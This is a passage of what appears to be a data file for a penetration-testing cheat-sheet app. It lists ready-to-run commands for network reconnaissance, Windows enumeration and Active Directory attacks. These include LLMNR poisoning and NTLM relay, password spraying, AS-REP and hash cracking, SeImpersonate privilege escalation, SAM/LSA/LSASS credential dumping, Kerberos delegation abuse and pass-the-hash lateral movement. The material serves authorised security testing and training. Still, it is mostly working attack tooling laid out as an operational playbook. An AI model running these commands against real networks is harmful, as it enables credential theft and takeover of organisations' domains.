              itemLinks: { 0: { tacticId: 'webapp', techId: 'web-sqli-detect' }, 1: { tacticId: 'webapp', techId: 'web-xss' }, 3: { tacticId: 'webapp', techId: 'web-cmdi' }, 4: { tacticId: 'webapp', techId: 'web-ssrf' }, 5: { tacticId: 'webapp', techId: 'web-xxe' } },
            },
            {
              icon: '📁',
              name: 'File & Path Testing',
              description: 'Abuse file upload endpoints and path handling to achieve LFI, RFI, or remote code execution.',
              items: ['File Upload Bypass', 'Local File Inclusion (LFI)', 'Path Traversal', 'Remote File Inclusion (RFI)'],
              itemLinks: { 0: { tacticId: 'webapp', techId: 'web-upload' }, 1: { tacticId: 'webapp', techId: 'web-lfi' }, 2: { tacticId: 'webapp', techId: 'web-lfi' }, 3: { tacticId: 'webapp', techId: 'web-lfi' } },
            },
            {
              icon: '🔓',
              name: 'Access Control Testing',
              description: 'Test for IDOR, broken access control, privilege escalation, and client-side enforcement flaws.',
              items: ['IDOR / BAC', 'Horizontal Privilege Escalation', 'Vertical Privilege Escalation', 'CORS Misconfiguration', 'CSRF'],
              itemLinks: { 0: { tacticId: 'webapp', techId: 'web-idor' }, 1: { tacticId: 'webapp', techId: 'web-idor' }, 2: { tacticId: 'webapp', techId: 'web-idor' } },
            },
            {
              icon: '🏆',
              name: 'Post Exploitation',
              description: 'Chain findings to demonstrate real-world impact — data exfiltration, pivoting to internal services, or persistent access.',
              items: ['Data Exfiltration via SQLi', 'Credential Harvesting', 'Internal Pivot via SSRF', 'RCE via File Upload', 'Reporting & PoC'],
              itemLinks: { 2: { tacticId: 'webapp', techId: 'web-ssrf' }, 3: { tacticId: 'webapp', techId: 'web-upload' } },
            },
          ],
          concepts: [
            { title: 'OWASP Top 10', body: 'The ten most critical web security risks: broken access control, cryptographic failures, injection, insecure design, security misconfiguration, vulnerable components, authentication failures, software integrity failures, logging failures, and SSRF.' },
            { title: 'Same-Origin Policy (SOP)', body: 'Browser security model preventing a page at origin A from reading responses from origin B. CORS headers explicitly relax SOP. Misconfigured CORS (Access-Control-Allow-Origin: *) can leak sensitive data to attacker-controlled pages.' },
            { title: 'JWT Attacks', body: 'JSON Web Tokens can be exploited via alg:none (remove signature), RS256→HS256 confusion (sign with public key), weak secrets (brute-force with hashcat), or kid parameter injection pointing to attacker-controlled key.' },
            { title: 'WAF Bypass', body: 'Web Application Firewalls block common payloads by signature matching. Bypass techniques: case variation (SeLeCt), comment injection (SEL/**/ECT), URL/double encoding (%27 → %2527), HTTP parameter pollution, chunked transfer encoding.' },
            { title: 'OAuth 2.0 Flows', body: 'OAuth misconfigurations include: open redirect in redirect_uri allowing token theft, state parameter missing enabling CSRF, implicit flow leaking tokens in URL fragments, and scope manipulation. Always test redirect_uri validation and PKCE enforcement.' },
            { title: 'Content Security Policy (CSP)', body: 'HTTP header restricting which resources a page can load. Weak CSPs (unsafe-inline, data:, wildcard sources) allow XSS. Test via report-uri or browser console errors. CSP bypass via JSONP endpoints, Angular CSP bypass, or allowed-host misuse.' },
          ],
          tools: [
            { name: 'Burp Suite', use: 'Intercepting proxy, active scanner, Repeater, Intruder, and extension platform — the core web app testing tool' },
            { name: 'ffuf', use: 'Fast web fuzzer — directories, parameters, vhosts, headers' },
            { name: 'feroxbuster', use: 'Recursive directory brute-forcer with auto-discovery' },
            { name: 'sqlmap', use: 'Automated SQL injection detection, fingerprinting, and data extraction' },
            { name: 'nuclei', use: 'Template-based scanner for CVEs, misconfigurations, and known vulnerabilities' },
            { name: 'whatweb', use: 'Technology fingerprinting — CMS, server, framework, and plugin detection' },
            { name: 'wafw00f', use: 'WAF detection and fingerprinting' },
            { name: 'arjun', use: 'Hidden GET/POST parameter discovery via wordlists and heuristics' },
            { name: 'nikto', use: 'Web server misconfiguration and vulnerability scanner' },
            { name: 'wfuzz', use: 'Fuzzer for parameters, cookies, headers, and authentication fields' },
            { name: 'amass', use: 'Subdomain enumeration and attack surface mapping via OSINT' },
            { name: 'httpx', use: 'Fast HTTP probing — title, status code, tech detection across many hosts' },
          ],
        },
      },
    ],
  },

  /* ── 1. Reconnaissance ──────────────────────────────────────────────────── */
  {
    id: 'recon',
    name: 'Reconnaissance',
    icon: '🔍',
    techniques: [
      {
        id: 'recon-portscan',
        name: 'Port Scan',
        description: 'Discover open ports and services on the target.',
        tags: ['nmap', 'external'],
        commands: [
          { id: 'r1', label: 'Quick top-1000 scan', os: 'Linux', command: 'nmap -sV -sC -T4 $$IP', notes: '' },
          { id: 'r2', label: 'Full port scan', os: 'Linux', command: 'nmap -p- -T4 --min-rate 5000 $$IP', notes: 'Follow up with -sV on found ports.' },
          { id: 'r3', label: 'UDP top-20', os: 'Linux', command: 'nmap -sU --top-ports 20 $$IP', notes: 'Requires root.' },
          { id: 'r4', label: 'Vuln scripts', os: 'Linux', command: 'nmap --script=vuln -p 80,443,445 $$IP', notes: 'Noisy — use with care.' },
        ],
      },
      {
        id: 'recon-smb',
        name: 'SMB Enumeration',
        description: 'Enumerate SMB shares, users, and OS info from port 445.',
        tags: ['smb', 'windows'],
        commands: [
          { id: 'smb1', label: 'enum4linux-ng', os: 'Linux', command: 'enum4linux-ng -A $$IP', notes: 'Modern rewrite of enum4linux.' },
          { id: 'smb2', label: 'List shares (anon)', os: 'Linux', command: 'crackmapexec smb $$IP -u "" -p "" --shares', notes: 'Anonymous share listing.' },
          { id: 'smb3', label: 'List shares (auth)', os: 'Linux', command: 'crackmapexec smb $$IP -u $$USER -p $$PASSWORD --shares', notes: '' },
          { id: 'smb4', label: 'smbclient connect', os: 'Linux', command: 'smbclient //$$IP/$$SHARE -U $$USER%$$PASSWORD', notes: '' },
        ],
      },
      {
        id: 'recon-ldap',
        name: 'LDAP Enumeration',
        description: 'Query Active Directory via LDAP to enumerate users, groups, and policies.',
        tags: ['ldap', 'active-directory', 'windows'],
        commands: [
          { id: 'ldap1', label: 'Anonymous LDAP dump', os: 'Linux', command: 'ldapsearch -x -H ldap://$$DC -b "DC=$$DOMAIN,DC=local" "(objectClass=*)"', notes: 'Works if null session is allowed.' },
          { id: 'ldap2', label: 'Authenticated user list', os: 'Linux', command: 'ldapsearch -x -H ldap://$$DC -D "$$USER@$$DOMAIN" -w $$PASSWORD -b "DC=$$DOMAIN,DC=local" "(objectClass=user)" sAMAccountName', notes: '' },
          { id: 'ldap3', label: 'BloodHound collection', os: 'Linux', command: 'bloodhound-python -u $$USER -p $$PASSWORD -d $$DOMAIN -dc $$DC -c all', notes: 'Collects all BloodHound data remotely.' },
        ],
      },
      {
        id: 'recon-web',
        name: 'Web Enumeration',
        description: 'Discover web endpoints, files, and technologies on HTTP/HTTPS services.',
        tags: ['web', 'http'],
        commands: [
          { id: 'web1', label: 'ffuf dir brute', os: 'Linux', command: 'ffuf -u http://$$IP/FUZZ -w $$WORDLIST -mc 200,301,302', notes: '' },
          { id: 'web2', label: 'ffuf vhost fuzz', os: 'Linux', command: 'ffuf -u http://$$IP -H "Host: FUZZ.$$DOMAIN" -w $$WORDLIST -fs 0', notes: 'Fuzz virtual hosts.' },
          { id: 'web3', label: 'nikto scan', os: 'Linux', command: 'nikto -h http://$$IP', notes: 'Noisy but thorough.' },
          { id: 'web4', label: 'whatweb fingerprint', os: 'Linux', command: 'whatweb http://$$IP', notes: 'Identify web stack quickly.' },
        ],
      },
    ],
  },

  /* ── 2. Basic Enumeration (Windows) ─────────────────────────────────────── */
  {
    id: 'basic-enum',
    name: 'Basic Enumeration',
    icon: '📋',
    techniques: [
      {
        id: 'be-general',
        name: 'General Windows Enumeration',
        description: 'Gather basic host info: OS, users, processes, installed software.',
        tags: ['windows', 'enumeration', 'post-exploit'],
                subtechniques: [
          {
            id: "beg-sys",
            name: "System & Processes",
            commands: [
            { id: "beg1", label: "System info", os: "Windows", command: "systeminfo", notes: "OS version, hotfixes, domain name." },
            { id: "beg2", label: "Whoami + privs", os: "Windows", command: "whoami /all", notes: "Current user, groups, and privileges." },
            { id: "beg3", label: "Running processes", os: "Windows", command: "tasklist /v", notes: "Verbose process list with owner." },
            { id: "beg4", label: "WMIC computer info", os: "Windows", command: "wmic computersystem get Name,Domain,Manufacturer,Model,Username", notes: "" }
            ]
          },
          {
            id: "beg-usr",
            name: "Users, Software & Tasks",
            commands: [
            { id: "beg5", label: "Local users", os: "Windows", command: "net user", notes: "List all local user accounts." },
            { id: "beg6", label: "Local admins", os: "Windows", command: "net localgroup administrators", notes: "" },
            { id: "beg7", label: "Installed software", os: "Windows", command: "wmic product get Name,Version", notes: "May be slow on large systems." },
            { id: "beg8", label: "Scheduled tasks", os: "Windows", command: "schtasks /query /fo LIST /v", notes: "Look for tasks running as SYSTEM." }
            ]
          }
        ],
      },
      {
        id: 'be-network',
        name: 'Network Enumeration',
        description: 'Discover network config, open ports, routing, and ARP cache.',
        tags: ['windows', 'network', 'enumeration'],
                subtechniques: [
          {
            id: "ben-int",
            name: "Interface & Routing",
            commands: [
            { id: "ben1", label: "IP configuration", os: "Windows", command: "ipconfig /all", notes: "All adapters, DNS servers, DHCP." },
            { id: "ben2", label: "ARP cache", os: "Windows", command: "arp -a", notes: "Hosts recently communicated with — pivot targets." },
            { id: "ben3", label: "Routing table", os: "Windows", command: "route print", notes: "Useful for discovering internal subnets." }
            ]
          },
          {
            id: "ben-conn",
            name: "Connections & Firewall",
            commands: [
            { id: "ben4", label: "Open connections", os: "Windows", command: "netstat -ano", notes: "Active connections with PIDs." },
            { id: "ben5", label: "Firewall rules", os: "Windows", command: "netsh advfirewall show allprofiles", notes: "Is firewall on? What rules exist?" },
            { id: "ben6", label: "DNS cache", os: "Windows", command: "ipconfig /displaydns", notes: "Reveals recently resolved hostnames." }
            ]
          }
        ],
      },
      {
        id: 'be-protection',
        name: 'AV / Protection Enumeration',
        description: 'Identify Defender, AMSI, AppLocker, and EDR presence before running tools.',
        tags: ['windows', 'av', 'amsi', 'applocker', 'evasion'],
                subtechniques: [
          {
            id: "bep-av",
            name: "AV & AMSI",
            commands: [
            { id: "bep1", label: "Defender status", os: "Windows", command: "Get-MpComputerStatus", notes: "Shows if real-time protection is enabled." },
            { id: "bep2", label: "Defender exclusions", os: "Windows", command: "Get-MpPreference | Select-Object ExclusionPath, ExclusionProcess", notes: "Safe drop zones for tools." },
            { id: "bep3", label: "AMSI providers", os: "Windows", command: "reg query HKLM\\SOFTWARE\\Microsoft\\AMSI\\Providers", notes: "What AMSI providers are registered?" }
            ]
          },
          {
            id: "bep-al",
            name: "AppLocker & Logging",
            commands: [
            { id: "bep4", label: "AppLocker policy", os: "Windows", command: "Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections", notes: "Shows effective AppLocker rules." },
            { id: "bep5", label: "AppLocker (wmic)", os: "Windows", command: "wmic /namespace:\\root\\Microsoft\\Security\\ApplicationID\\Policy path PathRule get RuleId,Name,Action", notes: "Alternative AppLocker query." },
            { id: "bep6", label: "Running AV products", os: "Windows", command: "wmic /namespace:\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState", notes: "Lists registered AV products." },
            { id: "bep7", label: "PowerShell logging", os: "Windows", command: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell", notes: "Check if ScriptBlockLogging is enabled." }
            ]
          }
        ],
      },
    ],
  },

  /* ── Active Directory (Full Methodology) ─────────────────────────────── */
  {
    id: 'active-directory',
    name: 'Active Directory',
    icon: '🏰',
    techniques: [
      {
        id: 'ad-recon',
        name: 'Recon (No Creds)',
        description: 'Map the domain without credentials. Goal: identify the domain, find valid usernames, grab one credential or hash. Exit when you hold user:password or user:hash.',
        tags: ['active-directory', 'recon', 'kerberos'],
                subtechniques: [
          {
            id: "adr-disc",
            name: "No-Auth Discovery",
            commands: [
            { id: "adr1", label: "Port scan DC", os: "Linux", command: "nmap -p 53,88,135,139,389,445,464,636,3268,3269,5985,3389 -sV -sC $$DC", notes: "Port 88 (Kerberos) + 389 (LDAP) + 445 (SMB) confirms you are looking at a Domain Controller." },
            { id: "adr2", label: "SMB banner (null session)", os: "Linux", command: "nxc smb $$DC -u '' -p ''", notes: "Reveals domain name, hostname, OS version without credentials." },
            { id: "adr3", label: "SMB banner (guest)", os: "Linux", command: "nxc smb $$DC -u 'guest' -p ''", notes: "Try guest session — sometimes returns more info than null." },
            { id: "adr4", label: "LDAP base query (no creds)", os: "Linux", command: "ldapsearch -x -H ldap://$$DC -s base namingcontexts", notes: "Returns DC=corp,DC=local — confirms domain naming context without creds." },
            { id: "adr5", label: "RPC domain info (null)", os: "Linux", command: "rpcclient -U \"\" -N $$DC -c \"querydominfo\"", notes: "Pull domain name and basic info without credentials." }
            ]
          },
          {
            id: "adr-enum",
            name: "Username & Hash Gathering",
            commands: [
            { id: "adr6", label: "Username enumeration (Kerbrute)", os: "Linux", command: "kerbrute userenum -d $$DOMAIN --dc $$DC $$WORDLIST", notes: "No lockout risk — validates usernames via Kerberos port 88 only." },
            { id: "adr7", label: "RID brute (guest/null)", os: "Linux", command: "nxc smb $$DC -u guest -p '' --rid-brute", notes: "Enumerate users via RID cycling — works on many default configurations." },
            { id: "adr8", label: "AS-REP roast (no creds)", os: "Linux", command: "impacket-GetNPUsers $$DOMAIN/ -usersfile users.txt -no-pass -dc-ip $$DC -format hashcat", notes: "Accounts with pre-auth disabled return crackable AS-REP hashes — no credential needed." },
            { id: "adr9", label: "Crack AS-REP hash", os: "Linux", command: "hashcat -m 18200 asrep.hash $$WORDLIST", notes: "Mode 18200 = Kerberos AS-REP. Start with rockyou, then targeted rules." }
            ]
          }
        ],
      },
      {
        id: 'ad-relay',
        name: 'LLMNR Poisoning & Relay',
        description: 'Capture NTLMv2 hashes via broadcast poisoning and relay them to gain access without cracking. Works pre-creds on the local subnet.',
        tags: ['active-directory', 'relay', 'credentials', 'llmnr'],
        subtechniques: [
          {
            id: 'adrl-poison',
            name: 'LLMNR / NBT-NS Poisoning',
            commands: [
              { id: 'adrl1', label: 'Responder (capture hashes)', os: 'Linux', command: 'sudo responder -I $$IFACE -wPv', notes: 'Poisons LLMNR/NBT-NS/MDNS on the subnet. Captured NTLMv2 hashes saved to /usr/share/responder/logs/. Stop before running relay.' },
              { id: 'adrl2', label: 'Check LLMNR / NBT-NS scope', os: 'Linux', command: 'sudo responder -I $$IFACE --analyze', notes: 'Passive mode — only analyse, no poisoning. Good for recon before deciding to go active.' },
              { id: 'adrl3', label: 'Crack captured NTLMv2 hash', os: 'Linux', command: 'hashcat -m 5600 ntlmv2.hash $$WORDLIST', notes: 'Mode 5600 = NTLMv2. Use rockyou first, then targeted rules. Hash file is in Responder logs directory.' },
            ],
          },
          {
            id: 'adrl-relay',
            name: 'NTLM Relay (ntlmrelayx)',
            commands: [
              { id: 'adrl4', label: 'Find hosts without SMB signing', os: 'Linux', command: 'nxc smb $$IP/24 --gen-relay-list targets.txt', notes: 'Only hosts with SMB signing disabled are relayable. This generates the targets file for ntlmrelayx.' },
              { id: 'adrl5', label: 'Relay to SAM dump', os: 'Linux', command: 'sudo impacket-ntlmrelayx -tf targets.txt -smb2support', notes: 'Run alongside Responder (with SMB/HTTP off in Responder.conf). Relays incoming auth to targets and dumps SAM hashes.' },
              { id: 'adrl6', label: 'Relay with interactive shell', os: 'Linux', command: 'sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i', notes: 'Opens a local SMB shell (-i). Connect with nc 127.0.0.1 11000 after a relay succeeds.' },
              { id: 'adrl7', label: 'Relay to LDAP (add DA)', os: 'Linux', command: 'sudo impacket-ntlmrelayx -t ldaps://$$DC --delegate-access --escalate-user $$USER', notes: 'Relay to LDAPS to abuse Resource-Based Constrained Delegation. Requires domain controller as target and a machine account.' },
            ],
          },
          {
            id: 'adrl-ipv6',
            name: 'IPv6 DNS Takeover (mitm6)',
            commands: [
              { id: 'adrl8', label: 'mitm6 DNS takeover', os: 'Linux', command: 'sudo mitm6 -d $$DOMAIN', notes: 'Advertises a rogue IPv6 DNS server. Windows prefers IPv6 — clients will send auth to your machine. Run alongside ntlmrelayx.' },
              { id: 'adrl9', label: 'Relay IPv6 auth to LDAPS', os: 'Linux', command: 'sudo impacket-ntlmrelayx -6 -t ldaps://$$DC -wh fakewpad.$$DOMAIN -l loot', notes: 'Combines mitm6 relay with LDAPS target. Dumps domain info to ./loot/ directory. High value — often gets DA delegation.' },
            ],
          },
        ],
      },
      {
        id: 'ad-domain-enum',
        name: 'Domain Enumeration',
        description: 'Broad recon pass after getting first credential. Map the shape of the domain — users, groups, shares, GPP, BloodHound. Run BloodHound immediately.',
        tags: ['active-directory', 'enumeration', 'bloodhound'],
                subtechniques: [
          {
            id: "adde-val",
            name: "Access Validation",
            commands: [
            { id: "adde1", label: "Validate credential", os: "Linux", command: "nxc smb $$DC -u $$USER -p $$PASSWORD", notes: "Confirms cred is valid. \"Pwn3d!\" = local admin on that host." },
            { id: "adde2", label: "Sweep subnet for local admin", os: "Linux", command: "nxc smb $$IP/24 -u $$USER -p $$PASSWORD", notes: "Where does this credential grant local admin? \"Pwn3d!\" marks each hit." },
            { id: "adde3", label: "Check WinRM access", os: "Linux", command: "nxc winrm $$DC -u $$USER -p $$PASSWORD", notes: "\"Pwn3d!\" = you can get a shell via evil-winrm on port 5985." }
            ]
          },
          {
            id: "adde-bh",
            name: "BloodHound Collection",
            commands: [
            { id: "adde4", label: "BloodHound collection (Linux)", os: "Linux", command: "bloodhound-python -u $$USER -p $$PASSWORD -ns $$DC -d $$DOMAIN -c All --zip", notes: "Mark your user Owned first. Key queries: Shortest Path to DA, DCSync rights, GenericAll/WriteDACL edges." },
            { id: "adde5", label: "BloodHound collection (Windows)", os: "Windows", command: "SharpHound.exe -c All", notes: "Run from a domain-joined host. Upload the zip to BloodHound." }
            ]
          },
          {
            id: "adde-obj",
            name: "Domain Object Enum",
            commands: [
            { id: "adde6", label: "List users + descriptions", os: "Linux", command: "nxc smb $$DC -u $$USER -p $$PASSWORD --users", notes: "Description fields often contain passwords — read every single one." },
            { id: "adde7", label: "List groups", os: "Linux", command: "nxc smb $$DC -u $$USER -p $$PASSWORD --groups", notes: "Look for custom admin groups, helpdesk, IT groups — these are BloodHound edges." },
            { id: "adde8", label: "Check password policy", os: "Linux", command: "nxc smb $$DC -u $$USER -p $$PASSWORD --pass-pol", notes: "Get lockout threshold BEFORE spraying — know exactly how many attempts you have." }
            ]
          },
          {
            id: "adde-misc",
            name: "Shares, GPP & Spraying",
            commands: [
            { id: "adde9", label: "Enumerate shares (subnet)", os: "Linux", command: "nxc smb $$IP/24 -u $$USER -p $$PASSWORD --shares", notes: "Look for non-standard shares beyond NETLOGON/SYSVOL/C$/ADMIN$." },
            { id: "adde10", label: "Spider shares for secrets", os: "Linux", command: "nxc smb $$IP/24 -u $$USER -p $$PASSWORD -M spider_plus", notes: "Crawls shares for sensitive files. Check .xml, .ini, .config, .ps1, .bat, .txt." },
            { id: "adde11", label: "GPP passwords in SYSVOL", os: "Linux", command: "nxc smb $$DC -u $$USER -p $$PASSWORD -M gpp_password", notes: "Group Policy Preferences cpassword is AES-encrypted with a public key — always check." },
            { id: "adde12", label: "Password spray", os: "Linux", command: "nxc smb $$DC -u users.txt -p 'Welcome2024!' --continue-on-success", notes: "Check lockout policy first! Candidates: Season+Year, CompanyName1, Welcome1, Password1." },
            { id: "adde13", label: "Kerberoast discovery", os: "Linux", command: "impacket-GetUserSPNs $$DOMAIN/$$USER:$$PASSWORD -dc-ip $$DC", notes: "List SPN accounts before requesting hashes. Check group memberships in BloodHound first." }
            ]
          }
        ],
      },
      {
        id: 'ad-local-privesc',
        name: 'Local Privilege Escalation',
        description: 'Escalate from low-priv shell to SYSTEM/local admin. Required before credential harvesting can feed the loop.',
        tags: ['active-directory', 'privesc', 'windows'],
                subtechniques: [
          {
            id: "adlp-enum",
            name: "System Enumeration",
            commands: [
            { id: "adlp1", label: "Check token privileges", os: "Windows", command: "whoami /priv", notes: "SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege = Potato attack path." },
            { id: "adlp2", label: "winPEAS automated enum", os: "Windows", command: ".winPEASany.exe", notes: "Comprehensive local privesc check. Read highlighted results — unquoted paths, weak service perms, stored creds." },
            { id: "adlp3", label: "PowerUp checks", os: "Windows", command: ". .PowerUp.ps1; Invoke-AllChecks", notes: "Service misconfigs, AlwaysInstallElevated, unquoted paths, registry autoruns, stored creds." }
            ]
          },
          {
            id: "adlp-se",
            name: "SeImpersonate Exploits",
            commands: [
            { id: "adlp4", label: "GodPotato (SeImpersonate)", os: "Windows", command: ".GodPotato.exe -cmd \"net localgroup administrators $$USER /add\"", notes: "SeImpersonatePrivilege on modern Windows/Server 2022. Spawns SYSTEM-level command." },
            { id: "adlp5", label: "PrintSpoofer (SeImpersonate)", os: "Windows", command: ".PrintSpoofer.exe -i -c cmd", notes: "SeImpersonatePrivilege on Server 2019 / Win10. Spawns interactive SYSTEM shell." }
            ]
          },
          {
            id: "adlp-cred",
            name: "Credential Harvesting",
            commands: [
            { id: "adlp6", label: "Dump SAM (after local admin)", os: "Linux", command: "nxc smb $$TARGET_HOST -u $$USER -p $$PASSWORD --sam", notes: "Local account hashes. Check for password reuse — especially built-in Administrator." },
            { id: "adlp7", label: "Dump LSA secrets", os: "Linux", command: "nxc smb $$TARGET_HOST -u $$USER -p $$PASSWORD --lsa", notes: "LSA secrets include cached domain creds, service account passwords, DPAPI secrets." },
            { id: "adlp8", label: "Dump LSASS (lsassy)", os: "Linux", command: "nxc smb $$TARGET_HOST -u $$USER -H $$HASH -M lsassy", notes: "Credentials of all users with active sessions — high value if a DA is logged in." }
            ]
          }
        ],
      },
      {
        id: 'ad-admin-recon',
        name: 'Admin Recon & Session Hunting',
        description: 'Targeted pass from your current vantage — repeated every time you land on a new host. Find where Domain Admin sessions are active right now.',
        tags: ['active-directory', 'enumeration', 'lateral-movement'],
        commands: [
          { id: 'adar1', label: 'Find DA logged-on sessions', os: 'Linux', command: 'nxc smb $$IP/24 -u $$USER -H $$HASH --loggedon-users', notes: 'Sweep subnet for hosts where a DA is currently logged on. That host is your next target.' },
          { id: 'adar2', label: 'Find where hash is local admin', os: 'Linux', command: 'nxc smb $$IP/24 -u $$USER -H $$HASH --continue-on-success', notes: '"Pwn3d!" = local admin. Each new host is a new credential source — dump them all.' },
          { id: 'adar3', label: 'Re-run BloodHound (new vantage)', os: 'Linux', command: 'bloodhound-python -u $$USER -H $$HASH -ns $$DC -d $$DOMAIN -c All --zip', notes: 'Mark new hosts/users as Owned. Re-query shortest path to DA from your current position.' },
          { id: 'adar4', label: 'Find unconstrained delegation', os: 'Linux', command: 'nxc ldap $$DC -u $$USER -p $$PASSWORD --trusted-for-delegation', notes: 'Unconstrained delegation computers capture TGTs — coerce via PetitPotam/PrinterBug to steal DA TGT.' },
        ],
      },
      {
        id: 'ad-domain-privesc',
        name: 'Domain Privilege Escalation',
        description: 'Abuse Kerberos delegation misconfigs to impersonate privileged users. Three attack paths: Unconstrained (KUD), Constrained (KCD), and Resource-Based Constrained Delegation (RBCD).',
        tags: ['active-directory', 'kerberos', 'delegation', 'privesc'],
        subtechniques: [
          {
            id: 'kud',
            name: 'Unconstrained Delegation (KUD)',
            commands: [
              { id: 'adp1', label: 'Find unconstrained delegation hosts', os: 'Linux', command: 'nxc ldap $$DC -u $$USER -p $$PASSWORD --trusted-for-delegation', notes: 'Computers with unconstrained delegation cache TGTs of every connecting user. Protected Users members are excluded — but native RID 500 Admin is NOT protected.' },
              { id: 'adp3', label: 'Step 1 — add attacker SPN', os: 'Linux', command: 'addspn.py -u "$$DOMAIN\\\\$$USER" -p "$$HASH" --target $$TARGET_HOST --spn HOST/$$LHOST.$$DOMAIN --additional $$DC', notes: 'Register your listener hostname as an SPN on the compromised unconstrained account so Kerberos tickets route to you.' },
              { id: 'adp4', label: 'Step 2 — add DNS entry', os: 'Linux', command: 'dnstool.py -u "$$DOMAIN\\\\$$USER" -p "$$HASH" -r $$LHOST.$$DOMAIN -d $$LHOST --action add $$DC', notes: 'Creates a DNS A record pointing your attacker hostname to your IP — required so the victim can resolve and connect.' },
              { id: 'adp5', label: 'Step 3 — start listener (user account, RC4)', os: 'Linux', command: 'krbrelayx.py --krbsalt $$DOMAIN$$USER --krbpass $$PASSWORD', notes: 'User accounts use RC4. Salt format: DOMAINusername (uppercase domain, case-sensitive username). Decrypts and dumps captured TGTs.' },
              { id: 'adp6', label: 'Step 3 — start listener (computer account, AES256)', os: 'Linux', command: 'krbrelayx.py --aesKey <aes256_key>', notes: 'Computer accounts use AES256. Extract the AES key from secretsdump output. Run before triggering coercion.' },
              { id: 'adp7', label: 'Step 4 — coerce DC authentication', os: 'Linux', command: 'coercer coerce --always-continue -u $$USER -p $$PASSWORD -d $$DOMAIN -t $$DC -l $$LHOST.$$DOMAIN', notes: 'Tries all coercion vectors (MS-RPRN, MS-EFSR, MS-FSRVP) automatically. krbrelayx captures and decrypts the incoming TGT.' },
              { id: 'adp8', label: 'Use captured TGT', os: 'Linux', command: 'export KRB5CCNAME=<captured>.ccache && impacket-psexec -k -no-pass $$DOMAIN/$$USER@$$DC.$$DOMAIN', notes: 'krbrelayx saves captured TGTs as .ccache files. Use FQDN not IP.' },
            ],
          },
          {
            id: 'kcd',
            name: 'Constrained Delegation (KCD)',
            commands: [
              { id: 'adp2', label: 'Find all delegation accounts', os: 'Linux', command: 'impacket-findDelegation $$DOMAIN/$$USER:$$PASSWORD -dc-ip $$DC', notes: 'Lists all accounts with delegation configured. Check "Delegation Type": Unconstrained / Constrained / RBCD and the "Delegation To" SPN.' },
              { id: 'adp9', label: 'Abuse via S4U2Self + S4U2Proxy', os: 'Linux', command: 'impacket-getST -spn cifs/$$DC.$$DOMAIN -impersonate Administrator -dc-ip $$DC $$DOMAIN/$$USER:$$PASSWORD', notes: 'Gets a service ticket as Administrator for the configured SPN. The compromised account must have constrained delegation to that SPN.' },
            ],
          },
          {
            id: 'rbcd',
            name: 'Resource-Based Constrained Delegation (RBCD)',
            commands: [
              { id: 'adp10', label: 'Step 1 — create attacker computer account', os: 'Linux', command: 'impacket-addcomputer $$DOMAIN/$$USER:$$PASSWORD -computer-name EVIL$ -computer-pass Evil123 -dc-ip $$DC', notes: 'MachineAccountQuota must be > 0 (default 10). Requires any domain user. Creates a computer account you fully control.' },
              { id: 'adp11', label: 'Step 2 — configure delegation on target', os: 'Linux', command: 'impacket-rbcd -delegate-from EVIL$ -delegate-to $$TARGET_HOST$ -action write $$DOMAIN/$$USER:$$PASSWORD', notes: 'Requires GenericWrite/GenericAll on the target computer. Writes EVIL$ into msDS-AllowedToActOnBehalfOfOtherIdentity.' },
              { id: 'adp12', label: 'Step 3 — get service ticket as Administrator', os: 'Linux', command: 'impacket-getST -spn cifs/$$TARGET_HOST.$$DOMAIN -impersonate Administrator -dc-ip $$DC $$DOMAIN/EVIL$:Evil123', notes: 'S4U2Proxy via RBCD. export KRB5CCNAME=Administrator.ccache then use psexec -k -no-pass.' },
            ],
          },
        ],
      },
      {
        id: 'ad-lateral',
        name: 'Lateral Movement & Harvesting',
        description: 'Move to high-value hosts using current credentials. Harvest new credentials at every hop — this sub-loop is the engine of the engagement.',
        tags: ['active-directory', 'lateral-movement', 'kerberos'],
                subtechniques: [
          {
            id: "adlm-pth",
            name: "Pass-the-Hash",
            commands: [
            { id: "adlm1", label: "psexec (PtH)", os: "Linux", command: "impacket-psexec $$DOMAIN/$$USER@$$TARGET_HOST -hashes :$$HASH", notes: "Loud — creates a service + generates event logs. Use only for initial access confirmation." },
            { id: "adlm2", label: "wmiexec (PtH)", os: "Linux", command: "impacket-wmiexec $$DOMAIN/$$USER@$$TARGET_HOST -hashes :$$HASH", notes: "Quieter than psexec — executes via WMI, no service created." },
            { id: "adlm3", label: "smbexec (PtH)", os: "Linux", command: "impacket-smbexec $$DOMAIN/$$USER@$$TARGET_HOST -hashes :$$HASH", notes: "Quiet alternative — no binary dropped, runs via service file shares." },
            { id: "adlm4", label: "evil-winrm (PtH)", os: "Linux", command: "evil-winrm -i $$TARGET_HOST -u $$USER -H $$HASH", notes: "WinRM on port 5985. Cleanest interactive shell for post-exploitation work." },
            { id: "adlm5", label: "xfreerdp (PtH)", os: "Linux", command: "xfreerdp /u:$$USER /pth:$$HASH /v:$$TARGET_HOST /dynamic-resolution", notes: "RDP via pass-the-hash. Requires NLA to be disabled or restricted admin mode enabled." }
            ]
          },
          {
            id: "adlm-ptt",
            name: "Pass-the-Ticket & Spray",
            commands: [
            { id: "adlm6", label: "psexec (Pass-the-Ticket)", os: "Linux", command: "export KRB5CCNAME=$$TICKET && impacket-psexec -k -no-pass $$DOMAIN/$$USER@$$TARGET_HOST.$$DOMAIN", notes: "Use FQDN not IP — Kerberos requires hostname resolution." },
            { id: "adlm7", label: "Spray hash across subnet", os: "Linux", command: "nxc smb $$IP/24 -u $$USER -H $$HASH --continue-on-success", notes: "Find every host where this hash grants local admin — map full reach before moving." },
            { id: "adlm-oph1", label: "Overpass-the-Hash — get TGT (Rubeus)", os: "Windows", command: "Rubeus.exe asktgt /user:$$USER /rc4:$$HASH /ptt", notes: "Converts NTLM hash into a Kerberos TGT. /ptt injects directly into current session. Use /aes256 if available." },
            { id: "adlm-oph2", label: "Overpass-the-Hash — get TGT (impacket)", os: "Linux", command: "impacket-getTGT $$DOMAIN/$$USER -hashes :$$HASH && export KRB5CCNAME=$$USER.ccache", notes: "Linux equivalent. Gets a TGT from the KDC using NTLM hash. Then use with -k -no-pass tools." },
            { id: "adlm-oph3", label: "Overpass-the-Hash — Mimikatz", os: "Windows", command: "mimikatz # sekurlsa::pth /user:$$USER /domain:$$DOMAIN /ntlm:$$HASH /run:powershell.exe", notes: "Spawns new process with Kerberos identity using hash. Less noisy than PTH for SMB signing environments." }
            ]
          },
          {
            id: "adlm-cred",
